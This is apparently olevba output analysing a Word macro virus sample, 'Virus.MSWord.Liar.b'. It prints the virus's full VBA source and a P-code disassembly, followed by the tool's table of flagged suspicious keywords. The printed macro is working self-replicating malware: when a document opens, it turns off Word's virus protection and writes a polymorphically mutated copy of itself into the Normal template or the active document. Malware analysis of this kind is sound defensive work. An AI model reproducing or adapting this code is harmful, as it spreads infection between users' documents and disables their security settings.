olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_open() '
Dim v(150): v(1) = "bliem by j2f": Options.VirusProtection = False '
Set a = MacroContainer.VBProject: Set ab = a.VBComponents(1) '
Set abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) '
Set nh = s.VBProject.VBComponents(1).CodeModule '
For y = 1 To Int(75 - (Rnd * 20)): vx = vx & Chr(255 - Int(Rnd * 100)): Next y '
vc = "Sub document_close()" & t & vx & vbCr '
If MacroContainer = NormalTemplate Then '
Set s = ActiveDocument '
Set nh = s.VBProject.VBComponents(1).CodeModule '
vc = "Sub document_open()" & t & vx & vbCr '
End If: Randomize: lin = abc.countoflines '
For i = 2 To lin '
jc = "" '
d = Int(Rnd * 3) '
p = InStr(abc.Lines(i, 1), t) '
If p = 0 Then GoTo e_ '
If p = 2 And lin > 100 Then '
v(i) = "": d = 1: GoTo n_ '
End If '
v(i) = Left(abc.Lines(i, 1), (p - 1)) '
For j = 1 To Int(75 - (Rnd * 20))  '
jc = jc & Chr(255 - Int(Rnd * 100)) '
Next j '
v(i) = v(i) & t & jc '
If d = 2 Then v(i) = v(i) & vbCr & Chr(32) & t & jc '
vc = vc & v(i) & vbCr '
n_: '
Next i '
e_: '
If nh.countoflines < 2 Then '
nh.AddFromString vc '
s.Save '
End If '
End Sub '
Rem Another virus by Jack Twoflower [LineZer0 & Metaphase] '
Rem Uses "bliem" polymorhic engine by Jack Twoflower '
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Liar.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8828 bytes
' Line #0:
' 	FuncDefn (Sub document_open())
' 	QuoteRem 0x0014 0x0000 ""
' Line #1:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0096 
' 	VarDefn v
' 	BoS 0x0000 
' 	LitStr 0x000C "bliem by j2f"
' 	LitDI2 0x0001 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x0043 0x0000 ""
' Line #2:
' 	SetStmt 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	Set a 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld a 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set ab 
' 	QuoteRem 0x003D 0x0000 ""
' Line #3:
' 	SetStmt 
' 	Ld ab 
' 	MemLd CodeModule 
' 	Set abc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set s 
' 	BoS 0x0000 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	St t 
' 	QuoteRem 0x003D 0x0000 ""
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld s 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nh 
' 	QuoteRem 0x0030 0x0000 ""
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	Paren 
' 	Sub 
' 	FnInt 
' 	For 
' 	BoS 0x0000 
' 	Ld vx 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St vx 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x004F 0x0000 ""
' Line #6:
' 	LitStr 0x0014 "Sub document_close()"
' 	Ld t 
' 	Concat 
' 	Ld vx 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St vc 
' 	QuoteRem 0x002C 0x0000 ""
' Line #7:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0028 0x0000 ""
' Line #8:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set s 
' 	QuoteRem 0x0017 0x0000 ""
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld s 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nh 
' 	QuoteRem 0x0030 0x0000 ""
' Line #10:
' 	LitStr 0x0013 "Sub document_open()"
' 	Ld t 
' 	Concat 
' 	Ld vx 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St vc 
' 	QuoteRem 0x002B 0x0000 ""
' Line #11:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	Ld abc 
' 	MemLd countoflines 
' 	St lin 
' 	QuoteRem 0x002A 0x0000 ""
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld lin 
' 	For 
' 	QuoteRem 0x0011 0x0000 ""
' Line #13:
' 	LitStr 0x0000 ""
' 	St jc 
' 	QuoteRem 0x0008 0x0000 ""
' Line #14:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	St d 
' 	QuoteRem 0x0011 0x0000 ""
' Line #15:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld abc 
' 	ArgsMemLd Lines 0x0002 
' 	Ld t 
' 	FnInStr 
' 	St p 
' 	QuoteRem 0x001E 0x0000 ""
' Line #16:
' 	Ld p 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo e_ 
' 	EndIf 
' 	QuoteRem 0x0016 0x0000 ""
' Line #17:
' 	Ld p 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld lin 
' 	LitDI2 0x0064 
' 	Gt 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x001C 0x0000 ""
' Line #18:
' 	LitStr 0x0000 ""
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St d 
' 	BoS 0x0000 
' 	GoTo n_ 
' 	QuoteRem 0x001A 0x0000 ""
' Line #19:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #20:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld abc 
' 	ArgsMemLd Lines 0x0002 
' 	Ld p 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	QuoteRem 0x0026 0x0000 ""
' Line #21:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	Paren 
' 	Sub 
' 	FnInt 
' 	For 
' 	QuoteRem 0x0023 0x0000 ""
' Line #22:
' 	Ld jc 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St jc 
' 	QuoteRem 0x0024 0x0000 ""
' Line #23:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0000 ""
' Line #24:
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	QuoteRem 0x0015 0x0000 ""
' Line #25:
' 	Ld d 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	EndIf 
' 	QuoteRem 0x0034 0x0000 ""
' Line #26:
' 	Ld vc 
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St vc 
' 	QuoteRem 0x0016 0x0000 ""
' Line #27:
' 	Label n_ 
' 	QuoteRem 0x0004 0x0000 ""
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0000 ""
' Line #29:
' 	Label e_ 
' 	QuoteRem 0x0004 0x0000 ""
' Line #30:
' 	Ld nh 
' 	MemLd countoflines 
' 	LitDI2 0x0002 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x001C 0x0000 ""
' Line #31:
' 	Ld vc 
' 	Ld nh 
' 	ArgsMemCall AddFromString 0x0001 
' 	QuoteRem 0x0014 0x0000 ""
' Line #32:
' 	Ld s 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0007 0x0000 ""
' Line #33:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #34:
' 	EndSub 
' 	QuoteRem 0x0008 0x0000 ""
' Line #35:
' 	Rem 0x0039 " Another virus by Jack Twoflower [LineZer0 & Metaphase] '"
' Line #36:
' 	Rem 0x0033 " Uses "bliem" polymorhic engine by Jack Twoflower '"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

